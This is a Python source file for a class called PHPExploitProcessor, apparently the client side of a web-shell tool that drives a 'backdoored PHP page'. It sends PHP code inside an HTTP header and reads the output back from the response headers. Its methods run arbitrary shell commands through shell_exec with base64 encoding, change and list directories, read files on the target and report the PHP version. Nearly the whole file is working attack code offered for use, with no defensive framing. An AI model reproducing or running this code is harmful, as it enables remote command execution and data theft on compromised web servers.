import base64  # encode commands
import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The PHPExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored PHP page.
        Inherits from the ExploitProcessor class. 
"""
class PHPExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        res = self._Base__send_message(f"header('{self.header}: '"
                                       f" . phpversion());"
                                       f"exit;")
        print("PHP Version: " + res)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(f"header('{self.header}: '"
                                            f" . getcwd());"
                                            f"exit;")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief Run a command on the target machine, and return its output as a
            string.
    @param command the command to be ran as a string
    @return a string of the output from the server, will be blank if it fails.
    @throw CommandException if there is a connection error.
    """
    def __run(self, command: str):
        encoded = base64.b64encode(command.encode()).decode()
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(shell_exec(base64_decode('{encoded}'))));"
            f"flush();"
        )
        return base64.b64decode(out.encode()).decode()
    
    """
    @brief Run commands to be evaluated as PHP code.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        out = self._Base__send_message(
            f"chdir('{self.directory}');"
            f"{command}"
            f"exit();")
        return out
    
    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(getcwd()));")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)
    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(implode(' ', scandir(getcwd()))));")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__run(self, options: str):
        output = self.__run(options)
        print(output)

    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        out = self.__eval(f"chdir('{options}');"
                          f"header('{self.header}: ' . "
                          f"base64_encode(getcwd()));")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        out = self.__eval(
            f"$f=fopen('{options}','r') or exit();"
            f"header('{self.header}: ' . "
            f"base64_encode(fread($f,filesize('{options}'))));"
            f"fclose($f);"
        )
        print(base64.b64decode(out).decode())
